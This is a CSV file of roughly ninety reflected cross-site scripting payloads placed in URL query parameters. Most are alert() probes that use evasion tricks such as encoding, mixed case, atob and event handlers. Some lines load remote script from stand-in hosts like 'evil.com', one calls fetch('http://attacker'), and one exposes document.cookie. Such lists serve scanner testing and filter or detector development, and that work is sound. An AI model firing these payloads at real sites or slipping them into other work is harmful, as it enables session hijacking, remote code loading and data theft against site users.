url,body
/search?q=<script>alert(1)</script>,
/profile?name=<img src=x onerror=alert(1)>,bio=test
/test?msg=<svg onload=alert(1)>,
/view?data=<iframe src=javascript:alert(1)>,ref=page
/form?input=%3Cscript%3Ealert(1)%3C/script%3E,
 /api?u=<body onload=alert(1)>,
/profile?name=<img src=x onerror=prompt(1)>,info=1
/page?q=<svg%20onload=confirm(1)>,
/q?x=<script>alert(String.fromCharCode(88,83,83))</script>,
/view?data=<details open ontoggle=alert(1)>,
/log?msg=<marquee onstart=alert(1)>,test=1
/x?x=<object data=javascript:alert(1)>,
/api?token=</script><script>alert(1)</script>,
/p?name=<img src=x:alert(1) onerror=eval(src)>,
/page?c=<script src=https://evil/x.js></script>,
/profile?desc=<script>fetch('http://attacker')</script>,
/news?title=<svg><script>alert(1)</script>,
/check?item=<script>new Image().src='x'</script>,
/id?x=<iframe src=javascript:prompt(1)>,
/index?cb=<img src=1 href=1 onerror=alert(1)>,
/page?search=<script>alert(document.cookie)</script>,
/view?usr=<svg/onload=alert(1)>,
/main?x=<embed src=javascript:alert(1)>,
/test?val=<video src=x onerror=alert(1)>,
/feed?id=<audio src=x onerror=alert(1)>,
/go?q=<script>alert(1)</script>,
/api?u=<input autofocus onfocus=alert(1)>,
/msg?q=<script>eval('alert(1)')</script>,
/box?id=<svg/onload=eval(atob('YWxlcnQoMSk='))>,
/view?data=<math href=javascript:alert(1)>,
/search?u=<svg/onload=alert`1`>,
/portal?cb=<script src=//evil.com/js.js></script>,
/load?x=<img/src=x onerror=alert(1)>,
/test?wrap=<div/onmouseover=alert(1)>move mouse</div>,
/trigger?x=<script>location='javascript:alert(1)'</script>,
/login?redirect=javascript:alert(1),
 /xss?payload=</TITLE><SCRIPT>alert(1)</SCRIPT>,
/p?z=<a href=javascript:alert(1)>Click</a>,
/json?callback=alert(1),
/info?cb=<script>alert(String.fromCodePoint(49))</script>,
/app?msg=<iframe/src=javascript:alert(1)>,
/public?q=<svg onload="alert(1)">,
/poll?opt=<meta charset=x onload=alert(1)>,
/log?x=<iframe/onload=alert(1)>,
/photo?id=<object type=text/html data=javascript:alert(1)>,
/shop?cb=<script>alert(1)//,
 /home?name=<sCrIpT>alert(1)</sCrIpT>,
/docs?v=<iframe srcdoc="<script>alert(1)</script>">,
/page?data=<svg><a xlink:href='javascript:alert(1)'>X</a>,
/news?item=<img src=x onerror="alert(1)">,
/api?html=<details open ontoggle=alert(1)>,
/r?p=<svg/onload=eval('alert(1)')>,
/search?f=<script>setTimeout('alert(1)',10)</script>,
/panel?cb=<script>throw alert(1)</script>,
/admin?u=<img src=x onerror=alert(/XSS/.source)>,
/test?i=<iframe src=javascript:'\u0061lert(1)'>,
/go?json=<script>alert(1)</script>,
/comment?msg=<script>alert(top.name)</script>,
/box?err=<img src onerror=alert(window.location)>,
/show?id=<script>alert(document.domain)</script>,
/tool?x=<svg/onload=alert(document.cookie)>,
/api?d=<script>alert(self)</script>,
/info?id=<img/onerror=alert(self.location.hash)>,
/route?x=<script>alert(opener)</script>,
/frame?cb=<iframe onload=alert(parent)>,
/app?id=<script>alert(frames.length)</script>,
/dev?msg=<script>alert(navigator.userAgent)</script>,
/auth?cb=<img src=x onerror=alert(navigator.language)>,
/load?js=<svg/onload=alert(Date.now())>,
/ui?e=<script>alert(document.URL)</script>,
/app?dbg=<img src=x onerror=alert(document.referrer)>,
/test?id=<svg/onload=alert(document.lastModified)>,
/debug?msg=<script>alert(innerWidth)</script>,
/api/check?x=<img src=x onerror=alert(innerHeight)>,
/time?z=<script>alert(screen.width)</script>,
/screen?x=<script>alert(screen.height)</script>,
/device?info=<img src=x onerror=alert(screenX)>,
/viewer?id=<svg/onload=alert(screenY)>,
/mobile?mode=<script>alert(history.length)</script>,
/acc?u=<svg/onload=alert(localStorage.length)>,
/item/view?id=<script>alert(sessionStorage.length)</script>,
/browser?z=<script>alert(window.length)</script>,
/click?msg=<img src=x onerror=alert(Math.random())>,
/api?i=<script>alert(Math.max(1,2))</script>,
/demo?view=<script>alert(performance.now())</script>,
/render?c=<svg/onload=alert(crypto.randomUUID())>,
/sys?cb=<img src=x onerror=alert('XSS-ADVANCED')>,
/hook?token=<script>new Function('alert(1)')()</script>,
/inject?d=<svg/onload=alert(atob('WFNT'))>,
/page?id=<script>alert(btoa('xss'))</script>,
/x?cmd=<SCRIPT>alert('XSS#100')</SCRIPT>,
